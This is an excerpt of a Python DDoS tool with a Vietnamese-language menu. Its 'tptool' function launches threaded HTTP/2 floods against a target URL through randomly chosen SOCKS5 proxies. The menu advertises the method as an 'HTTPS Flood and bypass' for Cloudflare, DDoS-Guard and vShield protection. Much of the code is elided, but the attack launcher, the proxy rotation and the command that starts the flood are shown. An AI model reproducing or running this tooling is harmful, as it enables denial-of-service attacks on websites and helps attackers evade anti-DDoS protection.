    ...
    #        limits = httpx.Limits(max_keepalive_connections=None, max_connections=None) 
            with httpx.Client(http2=True,proxies=random.choice(proxies),headers=headers,trust_env=False) as client:
                try:
                   ...
                   pass
#region testzone
def attackTPTOOL(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=LaunchTPTOOL, args=(url, timer)).start()

def LaunchTPTOOL(url, timer):
    prox = open("./socks5.txt", 'r').read().split('\n')
    proxy = random.choice(prox).strip().split(":")
    timelol = time.time() + int(timer)
    m = random.choice(method)
...
def help():
    ...
    stdout.write("             "+Fore.LIGHTGREEN_EX            +" \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"Thoát     "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" Thoát                      "+Fore.LIGHTGREEN_EX+"\n")
    stdout.write("             "+Fore.LIGHTGREEN_EX            +"╠═════════════════════════════════════════════════════╣\n")
    stdout.write("\n")
##############################################################################################
def credit():
...
def layer7():
    ...
    stdout.write("\n")
    stdout.write("\n")
    stdout.write("             "+Fore.LIGHTGREEN_EX            +"\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"tptool"+Fore.LIGHTGREEN_EX+" "+Fore.LIGHTWHITE_EX+" DDoS Ngon (VIP)                      "+Fore.LIGHTGREEN_EX+"\n")                     
    stdout.write("\n")
##############################################################################################
def layer4():
    clear()
...
def command():
    ...
    if command == "cls" or command == "clear":
        ...
        target, thread, t = get_info_l7()
        threading.Thread(target=attackTPTOOL, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif command == "bypass":
...
def func():
    ...
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"tptool        "+Fore.RED+": "+Fore.WHITE+"HTTPS Flood and bypass for CF NoSec, DDoS Guard Free and vShield with sock5\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"stellar    "+Fore.RED+": "+Fore.WHITE+"HTTPS tpking method without proxies\n")
